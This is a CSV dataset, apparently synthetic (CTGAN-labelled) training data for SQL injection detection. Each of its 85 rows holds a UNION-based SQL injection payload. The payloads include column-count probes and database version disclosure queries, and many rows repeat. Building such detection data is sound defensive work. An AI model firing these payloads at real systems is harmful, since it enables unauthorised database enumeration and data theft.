id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000199,6.140234155914208
CTGAN_000002,attack,union,"1'||  (  select 'dpce' from dual where 5261  =  5261 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000756,4.854704637238744
CTGAN_000003,attack,union,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",nearest_attack_euclidean,R000228,5.530757331914847
CTGAN_000004,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R000697,5.357151418681441
CTGAN_000005,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,5.217349439087199
CTGAN_000006,attack,union,"-1287""  )   as bbzg where 1475  =  1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#",nearest_attack_euclidean,R000513,6.29726606599255
CTGAN_000007,attack,union,"1""  )   as drrx where 8633  =  8633 union all select null,null,null--",nearest_attack_euclidean,R000418,4.966707086044974
CTGAN_000008,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000261,5.912619580841264
CTGAN_000009,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,5.189218975984117
CTGAN_000010,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000319,6.867367993418055
CTGAN_000011,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000504,5.82738103793913
CTGAN_000012,attack,union,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",nearest_attack_euclidean,R000281,4.494054822309441
CTGAN_000013,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,4.272634917769981
CTGAN_000014,attack,union,"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",nearest_attack_euclidean,R000252,4.066665724811695
CTGAN_000015,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.498742981607147
CTGAN_000016,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000525,6.5189429894848905
CTGAN_000017,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R000697,5.677413830556622
CTGAN_000018,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,6.355408300837553
CTGAN_000019,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R000289,6.2857438057732
CTGAN_000020,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000475,5.730611626006474
CTGAN_000021,attack,union,"1""  )   as upyn where 6185  =  6185 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000414,5.854473575292772
CTGAN_000022,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,4.861389586268736
CTGAN_000023,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000680,4.773980718654389
CTGAN_000024,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,6.201638244933973
CTGAN_000025,attack,union,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",nearest_attack_euclidean,R000394,6.402963742011825
CTGAN_000026,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R000738,5.721868900715162
CTGAN_000027,attack,union,"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",nearest_attack_euclidean,R000602,4.8954870588381425
CTGAN_000028,attack,union,"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",nearest_attack_euclidean,R000601,5.958557339939292
CTGAN_000029,attack,union,"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",nearest_attack_euclidean,R000395,6.214749260265559
CTGAN_000030,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,5.7576234902636765
CTGAN_000031,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000595,4.828000595005532
CTGAN_000032,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000629,5.215227441181899
CTGAN_000033,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,6.517821554048684
CTGAN_000034,attack,union,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",nearest_attack_euclidean,R000394,5.62984755977735
CTGAN_000035,attack,union,"-6778  )   as xutm where 6442  =  6442 union all select 6442,6442,6442,6442,6442,6442#",nearest_attack_euclidean,R000772,5.020996122485616
CTGAN_000036,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,5.529268706311898
CTGAN_000037,attack,union,"-6883""  )   as tbai where 8121  =  8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",nearest_attack_euclidean,R000322,5.214820628764836
CTGAN_000038,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,5.329198366537289
CTGAN_000039,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,5.201437737424631
CTGAN_000040,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000761,4.5428597044336385
CTGAN_000041,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000595,4.656998906330832
CTGAN_000042,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,5.301287665072724
CTGAN_000043,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,5.738580969003891
CTGAN_000044,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000554,4.9124035717647345
CTGAN_000045,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.365233600241091
CTGAN_000046,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,4.173412781313392
CTGAN_000047,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,5.085246346746048
CTGAN_000048,attack,union,"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",nearest_attack_euclidean,R000478,6.590393334343235
CTGAN_000049,attack,union,"1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000667,4.105517568327381
CTGAN_000050,attack,union,"1'+  (  select dklk where 9862  =  9862 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000217,5.20698045616677
CTGAN_000051,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,4.064193560754533
CTGAN_000052,attack,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000018,6.435446138502308
CTGAN_000053,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,4.448750681979419
CTGAN_000054,attack,union,1'||  (  select 'owzs' where 1475  =  1475 union all select null--,nearest_attack_euclidean,R000724,6.36401488067898
CTGAN_000055,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,4.8532406519574804
CTGAN_000056,attack,union,"-5058%' union all select 6789,6789,6789,6789,6789#",nearest_attack_euclidean,R000355,6.916420049392855
CTGAN_000057,attack,union,"-5360' where 8178  =  8178 union all select 8178,8178,8178--",nearest_attack_euclidean,R000616,6.563958644331003
CTGAN_000058,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,6.049730126479445
CTGAN_000059,attack,union,"1""  )   as upyn where 6185  =  6185 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000414,6.362059123391744
CTGAN_000060,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000761,5.79887050263095
CTGAN_000061,attack,union,"-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",nearest_attack_euclidean,R000490,5.105779948118455
CTGAN_000062,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000172,4.8796596047949805
CTGAN_000063,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,5.449295985275629
CTGAN_000064,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.995069432936855
CTGAN_000065,attack,union,"-3347'+  (  select xuzs where 1076  =  1076 union all select 1076,1076,1076,1076,1076--",nearest_attack_euclidean,R000325,5.638297750910809
CTGAN_000066,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,5.184907954257166
CTGAN_000067,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000475,4.892457694675497
CTGAN_000068,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,7.215769725182584
CTGAN_000069,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,6.145112410943348
CTGAN_000070,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000144,7.919164280242302
CTGAN_000071,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000677,6.021484125407468
CTGAN_000072,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000220,6.072429722705708
CTGAN_000073,attack,union,"-5275%'   )    )    union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",nearest_attack_euclidean,R000686,5.480204099141063
CTGAN_000074,attack,union,"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",nearest_attack_euclidean,R000212,4.211157227655343
CTGAN_000075,attack,union,"-8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974#",nearest_attack_euclidean,R000741,6.193961071159521
CTGAN_000076,attack,union,"-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",nearest_attack_euclidean,R000490,6.730099223729875
CTGAN_000077,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,4.8872830050916845
CTGAN_000078,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000474,4.874293590515259
CTGAN_000079,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000413,6.196839476994595
CTGAN_000080,attack,union,"-6778  )   as xutm where 6442  =  6442 union all select 6442,6442,6442,6442,6442,6442#",nearest_attack_euclidean,R000772,5.898125582892302
CTGAN_000081,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.7699516089147185
CTGAN_000082,attack,union,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",nearest_attack_euclidean,R000281,4.873759632633038
CTGAN_000083,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000549,5.834740048669524
CTGAN_000084,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R000697,5.891057917956004
CTGAN_000085,attack,union,"1'+  (  select dklk where 9862  =  9862 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000217,6.768790819439919
